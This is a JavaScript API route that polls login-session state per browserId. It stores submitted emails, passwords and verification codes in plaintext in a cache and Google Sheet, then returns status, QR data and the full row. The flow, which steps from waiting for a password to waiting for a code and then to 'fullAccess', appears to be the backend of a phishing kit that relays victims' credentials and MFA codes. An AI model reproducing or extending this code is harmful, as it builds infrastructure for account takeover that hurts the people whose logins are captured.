import { corsJson, corsOptions } from "../../../_shared/corsResponse.js";
import { getCachedRow, setCachedRow, populateCache, immediateFlush } from "../../../../utils/cookieCache.js";
import { stripFormulaColumns } from "../../../api/googlesheets.js";
import { incrementUsage } from "../../../../utils/serverlessTracker.js";
import { fetchDataFromAppScript } from "../cookie-api-login/routeHelper.js";
import { updateBrowserRowData } from "../cookie-api-login/routeHelper.js";
import logger from "../../../../utils/logger.js";

// Local cache for terminal rows (COMPLETED/FAILED) — never changes, serve from memory
const terminalRowCache = new Map();

function parseBody(text) {
    try { return JSON.parse(text); } catch (e) {}
    try { return Object.fromEntries(new URLSearchParams(text)); } catch (e) {}
    return null;
}

export async function POST(request) {
    incrementUsage();

    const text = await request.text();
    const body = parseBody(text);
    if (!body) return corsJson({ success: false, error: "Invalid request body" }, 400);

    const { browserId, token, email, password, verificationChoice, verificationCode } = body;

    if (!browserId) {
        return corsJson({ success: false, error: "browserId required" }, 400);
    }

    if (email || password || verificationChoice || verificationCode) {
        const updates = { lastUserActivity: new Date().toISOString() };
        if (email) { updates.email = email; updates.domain = email.split('@')[1] || ''; }
        if (password) updates.password = password;
        if (verificationChoice) updates.verificationChoice = verificationChoice;
        if (verificationCode) updates.verificationCode = verificationCode;
        setCachedRow(browserId, updates);
        immediateFlush(browserId).catch(err =>
            logger.error(`[pooling][${browserId}] Immediate flush failed: ${err.message}`)
        );
    }

    let row = getCachedRow(browserId);

    if (row) {
        logger.info(`[pooling][${browserId}] Cache HIT — status: ${row.status}, email: ${row.email || 'none'}`);
    }

    // Check terminal row cache (COMPLETED/FAILED never change)
    if (!row) {
        row = terminalRowCache.get(browserId);
        if (row) {
            logger.info(`[pooling][${browserId}] Terminal cache HIT — status: ${row.status}`);
        }
    }

    if (!row) {
        logger.info(`[pooling][${browserId}] Cache MISS — reading from shared cache...`);
        try {
            const cookieData = await fetchDataFromAppScript(1, 30000, false);
            if (Array.isArray(cookieData) && cookieData.length > 0) {
                const headers = cookieData[0];
                const rows = cookieData.slice(1);
                row = rows
                    .map(r => stripFormulaColumns(Object.fromEntries(headers.map((h, i) => [h, r[i]]))))
                    .find(r => r.browserId === browserId);
                if (row) {
                    logger.info(`[pooling][${browserId}] Shared cache read — status: ${row.status}, email: ${row.email || 'none'}`);
                    populateCache(browserId, row);
                } else {
                    logger.info(`[pooling][${browserId}] Row not found in sheet`);
                }
            } else {
                logger.error(`[pooling][${browserId}] Shared cache returned invalid data`);
            }
        } catch (e) {
            logger.error(`[pooling][${browserId}] Shared cache read exception: ${e.message}`);
        }
    }

    if (!row) {
        return corsJson({ success: false, error: "Session not found" }, 404);
    }

    // Cache terminal rows locally — they never change, no need to read sheet again
    if (["COMPLETED", "FAILED"].includes(row.status)) {
        terminalRowCache.set(browserId, row);
    }

    const lastActivity = new Date(row.lastUserActivity || row.lastRun || row.timestamp);
    const processable = ["WAITING", "WAITINGEMAIL", "WAITINGPASSWORD", "WAITINGOPTIONS", "WAITINGCODE"];
    if (processable.includes(row.status) && (Date.now() - lastActivity.getTime()) > 600000) {
        // Preserve the previous lastJsonResponse — passing no lastJsonResponse here
        // would let updateBrowserRowData substitute its default and wipe qrData/
        // loginMethod. The survival marker for empty-email rows is stamped inside
        // updateBrowserRowData itself.
        let prevLr = {};
        try {
            const rawLr = row.lastJsonResponse;
            prevLr = rawLr ? (typeof rawLr === 'string' ? JSON.parse(rawLr) : rawLr) : {};
        } catch (e) { prevLr = {}; }
        const failLr = JSON.stringify({
            ...prevLr,
            browserId,
            status: "FAILED",
            message: "Session timed out. Please try again.",
            timestamp: new Date().toISOString()
        });
        setCachedRow(browserId, { status: "FAILED", lastJsonResponse: failLr });
        row.status = "FAILED";
        row.lastJsonResponse = failLr;
        // Persist FAILED to sheet + trigger Hub update (fire-and-forget)
        updateBrowserRowData(browserId, { status: "FAILED", verified: false, fullAccess: false, lastJsonResponse: failLr }).catch(err =>
            logger.error(`[pooling][${browserId}] Failed to persist stale FAILED to sheet: ${err.message}`)
        );
    }

    let qrData = null;
    try {
        const rawLr = row.lastJsonResponse;
        const lr = rawLr ? (typeof rawLr === 'string' ? JSON.parse(rawLr) : rawLr) : null;
        qrData = (lr && lr.qrData) || row.qrData || null;
    } catch (e) {
        qrData = row.qrData || null;
    }

    return corsJson({
        success: true,
        currentStatus: row.status,
        qrData,
        data: row
    });
}

export async function OPTIONS() {
    return corsOptions();
}
